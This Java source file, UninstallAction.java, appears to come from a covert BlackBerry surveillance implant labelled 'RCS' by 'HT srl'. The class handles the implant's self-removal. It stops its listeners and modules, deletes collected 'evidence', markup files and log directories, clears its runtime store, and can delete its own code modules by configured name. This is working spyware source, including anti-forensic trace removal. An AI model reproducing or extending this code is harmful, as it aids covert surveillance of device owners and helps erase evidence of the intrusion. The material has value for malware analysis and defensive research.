//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : UninstallAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleManager;
import blackberry.Core;
import blackberry.Main;
import blackberry.Singleton;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.config.Cfg;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.EvidenceCollector;
import blackberry.evidence.Markup;
import blackberry.manager.EventManager;
import blackberry.manager.ModuleManager;
import blackberry.utils.Utils;

/**
 * The Class UninstallAction.
 */
public final class UninstallAction extends SubActionMain {
    //#ifdef DEBUG
    static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new uninstall action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public UninstallAction(final ConfAction params) {
        super(params);
    }
    
    protected boolean parse(ConfAction params) {
        return true;
    }

    public boolean execute(Trigger trigger) {
        Status.self().uninstall=true;
        return true;
    }

    public static boolean actualExecute() {

        boolean ret = stopServices();
        ret &= removeFiles();
        ret &= deleteRuntimeStore();
        //ret &= deleteApplication();
        Core.getInstance().uninstallAtExit();
        
        return ret;
    }

    private static boolean deleteRuntimeStore() {
        Singleton.self().deleteRuntime();
        return true;
    }

    public static boolean stopServices() {
        try {
            final Main main = (Main) Application.getApplication();
            main.stopListeners();

            ModuleManager.getInstance().stopAll();
            EventManager.getInstance().stopAll();

            Utils.sleep(5000);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("stopServices: " + ex);
            //#endif

            return false;
        }

        return true;
    }

    public static boolean deleteApplication() {
        try {
            
            Core.getInstance().uninstallAtExit();
            
            final ApplicationDescriptor ad = ApplicationDescriptor
                    .currentApplicationDescriptor();

            final int moduleHandle = ad.getModuleHandle();
            final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
            //final String errorString = Integer.toString(rc);
            //#ifdef DEBUG
            debug.info("deleteModuleEx result: " + rc);
            //#endif
            switch (rc) {
                case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
                    //#ifdef DEBUG
                    debug.info("Will be deleted on restart");
                    //#endif
                    // Device.requestPowerOff( true );
                    break;
                case CodeModuleManager.CMM_MODULE_IN_USE:
                case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
                    //#ifdef DEBUG
                    debug.info("Module In Use");
                    //#endif
                    break;
                case CodeModuleManager.CMM_HANDLE_INVALID:
                    //#ifdef DEBUG
                    debug.error("Invalid Handle");
                    //#endif
                    break;
                case CodeModuleManager.CMM_MODULE_REQUIRED:
                    //#ifdef DEBUG
                    debug.error("Module Required");
                    //#endif
                    break;
                default:
                    //#ifdef DEBUG
                    debug.error(Integer.toString(rc));
                    //#endif
                    //return false;
            }

            final int handles[] = CodeModuleManager.getModuleHandles();

            final int size = handles.length;
            for (int i = 0; i < size; i++) {
                final int handle = handles[i];
                //CodeModuleManager.getModuleHandle(name)
                // Retrieve specific information about a module.
                final String name = CodeModuleManager.getModuleName(handle);

                if (name.startsWith(Cfg.MODULE_NAME)) {
                    //#ifdef DEBUG
                    debug.warn("Removing handle: " + handle + " name: " + name);
                    //#endif
                    CodeModuleManager.deleteModuleEx(handle, true);
                }
            }
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("deleteApplication: " + ex);
            //#endif
            return false;
        }
        return true;
    }

    public static boolean removeFiles() {
        try {
            //#ifdef DEBUG
            Debug.stop();
            //#endif
            EvidenceCollector.getInstance().removeProgressive();
            Markup.removeMarkups();
            int removed=EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
      
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("removeFiles: " + ex);
            //#endif
            //return false;
        }
        return true;
    }



    //#ifdef DEBUG
    public String toString() {
        return "Uninstall";
    }
    //#endif
}
